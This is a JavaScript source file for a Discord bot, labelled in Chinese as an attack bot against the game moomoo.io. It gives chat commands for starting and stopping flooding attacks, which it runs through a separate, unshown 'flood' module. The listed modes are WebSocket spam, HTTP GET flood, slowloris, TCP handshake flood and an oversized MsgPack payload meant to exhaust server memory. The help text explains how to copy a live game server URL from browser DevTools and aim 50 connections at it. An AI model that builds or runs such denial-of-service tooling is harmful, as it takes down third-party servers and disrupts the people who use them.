const { Client, GatewayIntentBits } = require('discord.js');
const { startAttack, stopAttack } = require('./flood');

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
});

const PREFIX = '!';

const MODES = {
  ws: 'WebSocket flood — 用你提供的 token 開連線，發送封包 spam',
  http: 'HTTP GET flood — 大量 ping 請求',
  slowloris: 'Slow loris — 慢慢發送 header，佔住連線',
  tcphandshake: 'TCP handshake flood — 建立 TLS 連線後立刻發垃圾資料',
  msgpackbomb: 'MsgPack 炸彈 — 送超大 payload 讓伺服器 OOM',
};

client.on('messageCreate', async msg => {
  if (msg.author.bot) return;
  if (!msg.content.startsWith(PREFIX)) return;

  const [cmd, ...args] = msg.content.slice(PREFIX.length).split(/\s+/);

  if (cmd === 'attack') {
    const mode = args[0] || 'ws';
    const url = args[1];
    const count = parseInt(args[2]) || 30;

    if (!url) {
      return msg.reply(
        `格式: !attack <模式> <WS URL 或主機名> <連線數>\n` +
        `模式: ${Object.entries(MODES).map(([k,v]) => `\`${k}\` — ${v}`).join('\n')}\n` +
        `範例: !attack ws wss://sgs-xxx.singapore.moomoo.io/?token=alt:... 50`
      );
    }

    if (!Object.keys(MODES).includes(mode)) {
      return msg.reply(`未知模式 \`${mode}\`。可用: ${Object.keys(MODES).join(', ')}`);
    }

    await msg.reply(`⏳ ${mode} 攻擊 ${url} x${count}...`);
    try {
      const result = await startAttack(mode, url, count);
      await msg.reply(`✅ ${result.mode} 攻擊完成 → ${result.target}\n連線數: ${result.count}\n結果: ${JSON.stringify(result.result)}`);
    } catch (e) {
      await msg.reply(`❌ 錯誤: ${e.message}`);
    }
  }

  else if (cmd === 'stop') {
    if (await stopAttack()) {
      msg.reply('⛔ 已停止所有攻擊');
    } else {
      msg.reply('目前沒有執行的攻擊');
    }
  }

  else if (cmd === 'help') {
    msg.reply(
      `**moomoo.io 攻擊 bot**\n` +
      `\`!attack <模式> <目標> <連線數>\` — 發動攻擊\n` +
      `\`!stop\` — 停止所有攻擊\n` +
      `\`!modes\` — 列出所有模式\n` +
      `\`!help\` — 顯示此訊息\n\n` +
      `最快上手: 開遊戲 → DevTools → Network → WS → 複製 URL → \`!attack ws <URL> 50\``
    );
  }

  else if (cmd === 'modes') {
    msg.reply(Object.entries(MODES).map(([k,v]) => `**${k}**: ${v}`).join('\n'));
  }
});

client.login(process.env.DISCORD_TOKEN);
